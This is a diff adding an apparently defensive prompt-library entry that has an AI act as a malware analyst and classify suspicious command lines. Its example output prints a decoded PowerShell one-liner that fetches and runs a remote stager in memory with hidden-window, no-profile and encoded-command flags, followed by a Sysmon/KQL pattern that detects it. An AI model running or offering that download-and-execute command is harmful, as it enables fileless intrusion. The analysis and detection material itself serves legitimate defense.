@@ -1,0 +1,107 @@
+id: log-artifact-analyzer
+title: Log Artifact Analyzer
+category: analyze
+use_case: Analyze a suspicious command line, script, log entry, or encoded string for malicious indicators and technique attribution
+tags: [log-analysis, artifact-analysis, command-line, deobfuscation, attribution]
+mitre: [T1059, T1027, T1140]
+author: hrushikesh-badgujar
+contributed: 2026-05-28
+best_with: claude-3.5-sonnet
+limitations: Static analysis only — cannot execute or detonate code. May miss multi-layer obfuscation requiring runtime evaluation. Always sandbox-detonate confirmed malicious artifacts before relying solely on this output.
+
+prompt: |
+  You are a malware analyst and forensic investigator performing static artifact analysis.
+
+  Artifact to analyze:
+  {PASTE THE COMMAND LINE, SCRIPT, LOG ENTRY, OR ENCODED STRING HERE}
+
+  Analyze the artifact and return ONLY the following structure. Do not add any other text.
+
+  ARTIFACT TYPE: [Command Line / PowerShell Script / Batch / Bash / Encoded Payload / Log Entry / Other]
+  VERDICT: [Malicious / Likely Malicious / Suspicious / Likely Benign / Benign]
+  CONFIDENCE: [High / Medium / Low]
+  REASON: [One sentence explaining the verdict]
+
+  BREAKDOWN:
+  [Step-by-step parsing — decode base64, expand variables, trace execution flow, one step per line]
+
+  CAPABILITIES IDENTIFIED:
+  - [Specific capability, e.g., "Downloads remote payload from external URL"]
+
+  MITRE TTPs:
+  - [T####.###]: [Technique Name] — [How it maps to this artifact]
+
+  INDICATORS EXTRACTED:
+  - IPs / Domains: [one per line or "None"]
+  - File Paths: [one per line or "None"]
+  - Registry Keys: [one per line or "None"]
+  - Hashes: [one per line or "None"]
+
+  RISK FACTORS: [What makes this artifact high or low risk in context]
+
+  RECOMMENDED ACTIONS:
+  1. [Immediate analyst action]
+  2. [Follow-up investigation step]
+
+  DETECTION OPPORTUNITY: [Log source + field + value pattern that would catch this artifact at scale]
+
+example_output: |
+  ARTIFACT TYPE: PowerShell Command Line
+  VERDICT: Likely Malicious
+  CONFIDENCE: High
+  REASON: The command downloads and executes a remote script in-memory via IEX(DownloadString), a pattern with no legitimate administrative use in standard enterprise environments.
+
+  BREAKDOWN:
+  1. powershell.exe -nop -w hidden -enc — launches PowerShell with no profile, hidden window, encoded command
+  2. Base64 decode of encoded payload: IEX(New-Object Net.WebClient).DownloadString('http://185.220.x.x/stager.ps1')
+  3. IEX executes the downloaded content directly in memory — no file written to disk
+  4. Destination IP (185.220.x.x) is in a Tor exit node range
+
+  CAPABILITIES IDENTIFIED:
+  - Remote payload download over HTTP
+  - In-memory execution (fileless — evades file-based AV)
+  - Anti-forensic flags: no profile load (-nop), hidden window (-w hidden)
+
+  MITRE TTPs:
+  - T1059.001: PowerShell — primary execution method
+  - T1105: Ingress Tool Transfer — downloads stager from external IP
+  - T1027: Obfuscated Files or Information — base64-encoded command
+
+  INDICATORS EXTRACTED:
+  - IPs / Domains: 185.220.x.x
+  - File Paths: None (fileless execution)
+  - Registry Keys: None
+  - Hashes: None (payload not on disk)
+
+  RISK FACTORS: Tor exit node destination, fileless execution, hidden window — all three together indicate deliberate evasion. No legitimate tooling uses this pattern.
+
+  RECOMMENDED ACTIONS:
+  1. Isolate the originating host immediately and preserve memory before rebooting
+  2. Pull full process tree from EDR — identify what spawned powershell.exe and what child processes it created
+
+  DETECTION OPPORTUNITY:
+  Sysmon Event ID 1 — CommandLine contains "-enc" AND "-nop" AND "-w hidden" on the same powershell.exe invocation.
+  KQL: DeviceProcessEvents | where FileName =~ "powershell.exe" | where ProcessCommandLine has_all ("-enc", "-nop", "-w hidden")
+
+variants:
+  - model: gpt-4o
+    prompt: |
+      You are a malware analyst. Analyze the following artifact for malicious indicators.
+
+      Artifact:
+      {PASTE THE COMMAND LINE, SCRIPT, LOG ENTRY, OR ENCODED STRING HERE}
+
+      Return ONLY this structure — no prose, no preamble:
+
+      ARTIFACT TYPE: [type]
+      VERDICT: [Malicious/Likely Malicious/Suspicious/Likely Benign/Benign]
+      CONFIDENCE: [High/Medium/Low]
+      REASON: [one sentence]
+      BREAKDOWN: [step-by-step decode/parse, one step per line]
+      CAPABILITIES: [bullet list]
+      MITRE TTPs: [T####.### Name — mapping, one per line]
+      INDICATORS: [IPs, domains, paths, hashes — one per line or "None"]
+      RISK FACTORS: [one sentence]
+      ACTIONS: [numbered, max 2]
+      DETECTION: [log source + field + value]
+    notes: GPT-4o occasionally adds markdown headers or code fences — the explicit "no prose, no preamble" suppresses most of it. For heavily obfuscated payloads, follow up with "now decode the next layer" to walk through multi-stage obfuscation.
